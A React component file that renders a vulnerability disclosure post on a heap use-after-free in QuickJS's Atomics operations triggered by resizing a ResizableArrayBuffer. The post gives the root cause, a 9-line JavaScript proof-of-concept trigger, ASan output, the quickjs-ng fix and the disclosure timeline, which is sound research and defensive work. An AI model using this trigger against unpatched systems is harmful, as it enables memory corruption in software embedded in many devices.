/* QuickJS Atomics UAF post */

function PostQuickJSProgress() {
  const [pct, setPct] = React.useState(0);
  React.useEffect(() => {
    const onScroll = () => {
      const h = document.documentElement;
      const max = h.scrollHeight - h.clientHeight;
      setPct(max > 0 ? (h.scrollTop / max) : 0);
    };
    window.addEventListener('scroll', onScroll, { passive: true });
    onScroll();
    return () => window.removeEventListener('scroll', onScroll);
  }, []);
  const totalBytes = 0x2a00;
  const cur = Math.floor(pct * totalBytes);
  const hex = (n) => '0x' + n.toString(16).padStart(4, '0');
  return (
    <>
      <div className="post-progress" style={{width: (pct * 100) + '%'}}/>
      <div className="post-progress-label">
        <span className="offset">{hex(cur)}</span> / {hex(totalBytes)} &nbsp;<span style={{color:'var(--ink-ghost)'}}>·</span>&nbsp; {Math.round(pct*100)}%
      </div>
    </>
  );
}

function QCode({ lang, file, lines }) {
  const [copied, setCopied] = React.useState(false);
  const raw = lines.map(l => l.text || '').join('\n');
  return (
    <div className="codeblock">
      <div className="codeblock-head">
        <span><span className="lang">{lang}</span> &nbsp; · &nbsp; <span style={{color:'var(--ink-dim)'}}>{file}</span></span>
        <button onClick={() => { navigator.clipboard?.writeText(raw); setCopied(true); setTimeout(()=>setCopied(false),1200); }}>
          {copied ? '✓ copied' : 'copy'}
        </button>
      </div>
      <pre><code>
        {lines.map((l, i) => (
          <div key={i} className={'line ' + (l.hl ? 'hl' : '')}>
            <span className="ln">{i + 1}</span>
            <span dangerouslySetInnerHTML={{__html: l.html || l.text || ''}}/>
          </div>
        ))}
      </code></pre>
    </div>
  );
}

function QTOC() {
  const items = [
    { id: 'q-target', label: 'Target & context' },
    { id: 'q-pattern', label: 'The bug pattern' },
    { id: 'q-root', label: 'Root cause' },
    { id: 'q-poc', label: 'Proof of concept' },
    { id: 'q-asan', label: 'ASan confirmation' },
    { id: 'q-scope', label: 'Full scope' },
    { id: 'q-fix', label: 'Fix' },
    { id: 'q-disclosure', label: 'Disclosure' },
  ];
  const [active, setActive] = React.useState('q-target');
  React.useEffect(() => {
    const onScroll = () => {
      let cur = items[0].id;
      for (const it of items) {
        const el = document.getElementById(it.id);
        if (el && el.getBoundingClientRect().top < 120) cur = it.id;
      }
      setActive(cur);
    };
    window.addEventListener('scroll', onScroll, { passive: true });
    onScroll();
    return () => window.removeEventListener('scroll', onScroll);
  }, []);
  return (
    <div className="post-toc">
      <h4>contents</h4>
      <ol>
        {items.map(it => (
          <li key={it.id} className={active === it.id ? 'active' : ''}>
            <a href={'#' + it.id} className="bare">{it.label}</a>
          </li>
        ))}
      </ol>
    </div>
  );
}

function QPostSide() {
  return (
    <aside className="post-side">
      <div className="block">
        <h4>status</h4>
        <div style={{color:'var(--ink-dim)', lineHeight: 1.7}}>
          <div><span style={{color:'var(--ok)'}}>disclosed</span></div>
          <div style={{fontSize: 10, color: 'var(--ink-faint)', marginTop: 6}}>
            reported to bellard. CVE request filed.
          </div>
        </div>
      </div>
      <div className="block">
        <h4>reading</h4>
        <div style={{color:'var(--ink-dim)', lineHeight: 1.7}}>
          <div>~ 10 min</div>
          <div>6 code snippets</div>
          <div>ASan output</div>
        </div>
      </div>
      <div className="block">
        <h4>cwe</h4>
        <div style={{color:'var(--ink-dim)', lineHeight: 1.7, fontSize: 12}}>
          <div>CWE-416</div>
          <div style={{fontSize: 11, color:'var(--ink-faint)'}}>Use After Free</div>
        </div>
      </div>
      <div className="block">
        <h4>questions?</h4>
        <div style={{color:'var(--ink-dim)', lineHeight: 1.7, fontSize: 11}}>
          Ping me on X <a href="https://x.com/ze3ter_" style={{color:'inherit', border:'none'}} className="bare">@ze3ter_</a>
        </div>
      </div>
    </aside>
  );
}

function PostQuickJSPage() {
  return (
    <>
      <TopBar current="home" />
      <PostQuickJSProgress />
      <main className="page">
        <div className="post-hero">
          <div className="post-meta-line">
            <span className="id">#03</span>
            <span className="sep">·</span>
            <span>CVE candidate</span>
            <span className="sep">·</span>
            <span>quickjs / atomics</span>
            <span className="sep">·</span>
            <span>2026-04-25</span>
            <span className="sep">·</span>
            <span style={{color:'var(--ok)'}}>disclosed</span>
          </div>
          <h1 className="post-title">
            QuickJS — Heap-UAF in <span style={{color:'var(--accent)'}}>Atomics</span> via ResizableArrayBuffer
          </h1>
          <p className="post-subtitle">
            All 8 Atomics operations in bellard/quickjs capture a raw pointer before value coercion.
            A valueOf() that resizes the backing RAB frees that pointer. The atomic op writes to freed memory.
            9-line PoC. Confirmed with ASan.
          </p>
          <div className="post-info">
            <div className="post-info-cell"><div className="k">target</div><div className="v">bellard/quickjs master (d7ae12a)</div></div>
            <div className="post-info-cell"><div className="k">class</div><div className="v">heap use-after-free write</div></div>
            <div className="post-info-cell"><div className="k">state</div><div className="v" style={{color:'var(--ok)'}}>disclosed</div></div>
            <div className="post-info-cell"><div className="k">found</div><div className="v">2026-04-25</div></div>
          </div>
        </div>

        <div className="post-body-grid">
          <QTOC />

          <article className="prose">
            <p className="lead">
              QuickJS is Fabrice Bellard's compact JavaScript engine — single C file, widely embedded in
              IoT firmware, game engines, and developer tools. In March 2026 the repo received a batch of
              typed-array safety fixes. One path was left unpatched: the Atomics operations.
              All eight of them share the same use-after-free pattern.
            </p>

            <h2 id="q-target">Target &amp; context</h2>
            <p>
              The target is <code>bellard/quickjs</code> at master commit <code>d7ae12a</code> (2026-03-23).
              The same codebase that received fixes for <code>TypedArray.prototype.sort</code>,{' '}
              <code>.with()</code>, and the TypedArray constructor — all related to ResizableArrayBuffer
              side-effects — but did not receive the corresponding fix for Atomics.
            </p>
            <p>
              The <code>quickjs-ng</code> fork <em>did</em> fix the Atomics path. Their commit comment
              even says <em>"check if an evil .valueOf has resized or detached the array"</em> and
              re-fetches the pointer after coercion. Bellard's original missed this.
            </p>

            <h2 id="q-pattern">The bug pattern</h2>
            <p>
              The recurring pattern across all the March 2026 QuickJS fixes is the same:
            </p>
            <QCode
              lang="text"
              file="pattern"
              lines={[
                { html: '<span class="tok-com">// Step 1: capture pointer / length from current buffer</span>' },
                { html: '<span class="tok-kw">old_len</span> = p-&gt;u.array.count;' },
                { html: '<span class="tok-kw">ptr</span>     = p-&gt;u.array.u.uint8_ptr + idx * size;' },
                { html: '' },
                { html: '<span class="tok-com">// Step 2: JS value conversion  ← user code runs here</span>' },
                { html: '<span class="tok-fn">JS_ToUint32</span>(ctx, &amp;v32, argv[2]);  <span class="tok-com">// calls evil.valueOf()</span>', hl: true },
                { html: '<span class="tok-com">//         → rab.resize(BIG) → js_realloc() → ptr FREED</span>', hl: true },
                { html: '' },
                { html: '<span class="tok-com">// Step 3: re-validate (checks idx, not ptr)</span>' },
                { html: '<span class="tok-kw">if</span> (typed_array_is_oob(p)) ...;' },
                { html: '<span class="tok-kw">if</span> (idx &gt;= p-&gt;u.array.count) ...;' },
                { html: '' },
                { html: '<span class="tok-com">// Step 4: use stale ptr → UAF write</span>' },
                { html: '<span class="tok-fn">atomic_fetch_add</span>((_Atomic(<span class="tok-ty">uint32_t</span>)*)ptr, v);', hl: true },
              ]}
            />
            <p>
              The re-validation in step 3 correctly detects buffer shrinkage (idx now OOB) and detachment,
              but does <em>not</em> re-fetch <code>ptr</code>. When the buffer is resized to an equal or
              larger size, <code>idx</code> stays valid — the check passes — but <code>ptr</code> points
              to the old allocation that <code>js_realloc()</code> already freed and may have moved.
            </p>

            <h2 id="q-root">Root cause</h2>
            <p>
              When a regular (non-shared) ResizableArrayBuffer is resized, QuickJS calls{' '}
              <code>js_realloc(ctx, abuf-&gt;data, new_len)</code>. This is a standard
              heap realloc — it <em>can move the allocation</em> to a different address.
              The engine then calls <code>js_array_buffer_update_typed_arrays(abuf)</code> which
              walks all linked typed arrays and updates their <code>p-&gt;u.array.u.ptr</code>
              to the new address.
            </p>
            <p>
              <code>ptr</code> in <code>js_atomics_op</code> and <code>js_atomics_store</code>
              is computed <em>before</em> this update and is never refreshed after the JS call.
              It is a dangling pointer to the freed old region.
            </p>

            <QCode
              lang="c"
              file="quickjs.c — js_atomics_op (simplified)"
              lines={[
                { html: '<span class="tok-kw">if</span> (js_atomics_get_ptr(ctx, &amp;ptr, &amp;p, &amp;idx, &amp;size_log2, &amp;class_id,' },
                { html: '                       argv[0], argv[1], 0))' },
                { html: '    <span class="tok-kw">return</span> JS_EXCEPTION;' },
                { html: '<span class="tok-com">// ptr = p-&gt;u.array.u.uint8_ptr + idx * size  ← captured here</span>' },
                { html: '' },
                { html: '<span class="tok-ty">uint32_t</span> v32;' },
                { html: '<span class="tok-fn">JS_ToUint32</span>(ctx, &amp;v32, argv[2]);  <span class="tok-com">// JS call — may realloc</span>', hl: true },
                { html: '' },
                { html: '<span class="tok-kw">if</span> (<span class="tok-fn">typed_array_is_oob</span>(p)) <span class="tok-kw">return</span> ...;  <span class="tok-com">// checks abuf, not ptr</span>' },
                { html: '<span class="tok-kw">if</span> (idx &gt;= p-&gt;u.array.count) <span class="tok-kw">return</span> ...;  <span class="tok-com">// idx may still be valid</span>' },
                { html: '' },
                { html: '<span class="tok-com">// ptr is stale — old buffer was freed by realloc above</span>' },
                { html: 'a = <span class="tok-fn">atomic_fetch_add</span>((_Atomic(<span class="tok-ty">uint32_t</span>)*)ptr, v);  <span class="tok-com">// UAF WRITE</span>', hl: true },
              ]}
            />

            <h2 id="q-poc">Proof of concept</h2>
            <p>
              The exploit trigger is 9 lines. Start small (4 bytes) so realloc is forced to move the
              allocation when growing to a large size.
            </p>

            <QCode
              lang="js"
              file="poc_minimal.js"
              lines={[
                { html: '<span class="tok-kw">const</span> rab = <span class="tok-kw">new</span> <span class="tok-ty">ArrayBuffer</span>(<span class="tok-num">4</span>, { maxByteLength: <span class="tok-num">4</span> * <span class="tok-num">1024</span> * <span class="tok-num">1024</span> });' },
                { html: '<span class="tok-kw">const</span> ta  = <span class="tok-kw">new</span> <span class="tok-ty">Int32Array</span>(rab);' },
                { html: '' },
                { html: '<span class="tok-kw">const</span> evil = {' },
                { html: '  <span class="tok-fn">valueOf</span>() {' },
                { html: '    rab.<span class="tok-fn">resize</span>(<span class="tok-num">4</span> * <span class="tok-num">1024</span> * <span class="tok-num">1024</span>);  <span class="tok-com">// realloc → ptr freed, moved</span>', hl: true },
                { html: '    <span class="tok-kw">return</span> <span class="tok-num">1</span>;' },
                { html: '  }' },
                { html: '};' },
                { html: '' },
                { html: '<span class="tok-ty">Atomics</span>.<span class="tok-fn">add</span>(ta, <span class="tok-num">0</span>, evil);  <span class="tok-com">// heap-UAF write</span>', hl: true },
              ]}
            />

            <h2 id="q-asan">ASan confirmation</h2>
            <p>
              Compiled with <code>clang -fsanitize=address,undefined</code> and run against the PoC above:
            </p>

            <QCode
              lang="text"
              file="$ ASAN_OPTIONS=detect_leaks=0 ./qjs poc_minimal.js"
              lines={[
                { html: '<span class="tok-acc">ERROR: AddressSanitizer: heap-use-after-free</span>' },
                { html: '<span class="tok-acc">WRITE of size 4</span> at 0x7b62f33e0650 thread T0' },
                { html: '    #0 <span class="tok-fn">js_atomics_op</span> quickjs.c:<span class="tok-num">59151</span>:9', hl: true },
                { html: '    #1 js_call_c_function quickjs.c:17263:19' },
                { html: '    #2 JS_CallInternal quickjs.c:17445:16' },
                { html: '' },
                { html: '<span class="tok-com">0x7b62f33e0650 is located 0 bytes inside of 4-byte region</span>' },
                { html: '<span class="tok-com">freed by thread T0 here:</span>' },
                { html: '    #0 <span class="tok-fn">realloc</span>  (qjs_test)' },
                { html: '    #1 <span class="tok-fn">js_def_realloc</span> quickjs.c:1784:11', hl: true },
              ]}
            />

            <p>
              The write lands at exactly the start of the freed 4-byte region. ASan's shadow bytes
              confirm it as a freed heap chunk (<code>fd</code>), not just a read past bounds.
            </p>

            <h2 id="q-scope">Full scope</h2>
            <p>
              Every Atomics operation routes through <code>js_atomics_op</code> or{' '}
              <code>js_atomics_store</code>. All are affected:
            </p>

            <div style={{border: '1px solid var(--rule)', marginBottom: 24}}>
              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:0, padding:'10px 16px', background:'var(--bg-elev)', borderBottom:'1px solid var(--rule)', fontSize:10, letterSpacing:'0.14em', textTransform:'uppercase', color:'var(--ink-faint)'}}>
                <span>function</span><span>trigger arg</span><span>result</span>
              </div>
              {[
                ['Atomics.add(ta, idx, evil)', 'argv[2].valueOf()', 'UAF write'],
                ['Atomics.sub(ta, idx, evil)', 'argv[2].valueOf()', 'UAF write'],
                ['Atomics.and(ta, idx, evil)', 'argv[2].valueOf()', 'UAF write'],
                ['Atomics.or(ta, idx, evil)', 'argv[2].valueOf()', 'UAF write'],
                ['Atomics.xor(ta, idx, evil)', 'argv[2].valueOf()', 'UAF write'],
                ['Atomics.exchange(ta, idx, evil)', 'argv[2].valueOf()', 'UAF write'],
                ['Atomics.store(ta, idx, evil)', 'argv[2].valueOf()', 'UAF write'],
                ['Atomics.compareExchange(ta, idx, evil, rep)', 'argv[2].valueOf()', 'UAF write'],
                ['Atomics.compareExchange(ta, idx, exp, evil)', 'argv[3].valueOf()', 'UAF write'],
              ].map(([fn, arg, res], i) => (
                <div key={i} style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:0, padding:'9px 16px', borderBottom: i < 8 ? '1px solid var(--rule)' : 'none', fontSize:12.5}}>
                  <code style={{fontSize:11, color:'var(--ink)'}}>{fn.split('(')[0]}</code>
                  <span style={{color:'var(--ink-dim)', fontSize:11}}>{arg}</span>
                  <span style={{color:'var(--accent)', fontSize:11}}>{res}</span>
                </div>
              ))}
            </div>

            <p>
              Confirmed individually with ASan for all 8 operations. <code>compareExchange</code>
              has two attack vectors (argv[2] and argv[3]), both confirmed.
            </p>

            <h2 id="q-fix">Fix</h2>
            <p>
              Re-fetch <code>ptr</code> from <code>p-&gt;u.array.u.uint8_ptr</code> after value
              coercion and after the bounds re-validation. The quickjs-ng fork already applies exactly this:
            </p>

            <QCode
              lang="c"
              file="quickjs.c — correct pattern (from quickjs-ng)"
              lines={[
                { html: '<span class="tok-com">/* convert value — JS call, may resize */</span>' },
                { html: '<span class="tok-fn">JS_ToUint32</span>(ctx, &amp;v32, argv[2]);' },
                { html: '' },
                { html: '<span class="tok-com">/* check if an evil .valueOf has resized or detached the array */</span>' },
                { html: '<span class="tok-kw">if</span> (idx &gt;= p-&gt;u.array.count)' },
                { html: '    <span class="tok-kw">return</span> <span class="tok-fn">JS_ThrowRangeError</span>(ctx, <span class="tok-str">"out-of-bound access"</span>);' },
                { html: '' },
                { html: '<span class="tok-com">// Re-fetch ptr AFTER conversion — fixes UAF</span>', hl: true },
                { html: 'ptr = p-&gt;u.array.u.uint8_ptr + ((<span class="tok-ty">uintptr_t</span>)idx &lt;&lt; size_log2);', hl: true },
                { html: '' },
                { html: '<span class="tok-com">// now safe to use</span>' },
                { html: 'a = <span class="tok-fn">atomic_fetch_add</span>((_Atomic(<span class="tok-ty">uint32_t</span>)*)ptr, v);' },
              ]}
            />

            <h2 id="q-disclosure">Disclosure</h2>
            <p>
              Reported privately to bellard via GitHub Security Advisory on 2026-04-25.
              CVE request filed with MITRE / GitHub Advisory Database.
            </p>
            <p>
              The <code>quickjs-ng</code> fix was referenced as the correct resolution.
              7-day patch window provided before public disclosure.
            </p>

            <blockquote>
              The interesting thing about this bug is not the technique — TOCTOU after JS coercion is
              a known class. The interesting thing is that the same repository patched three related bugs
              in the same month and left this one. The diff between patched and unpatched is one line.
            </blockquote>

            <div className="tag-row">
              <span className="tag">quickjs</span>
              <span className="tag">use-after-free</span>
              <span className="tag">atomics</span>
              <span className="tag">resizable-arraybuffer</span>
              <span className="tag">cwe-416</span>
              <span className="tag">cve-candidate</span>
            </div>

            <div className="post-nav">
              <a href="post.html" className="bare">
                <div className="dir">← previous</div>
                <div className="tt">V8 12.4 — OOB Heap Write via Atomics.store on Float16Array</div>
              </a>
              <a href="index.html" className="bare nxt">
                <div className="dir">home →</div>
                <div className="tt">ze3tar / research</div>
              </a>
            </div>
          </article>

          <QPostSide />
        </div>
      </main>
      <Footer />
      <TweaksPanel />
    </>
  );
}

Object.assign(window, { PostQuickJSPage });
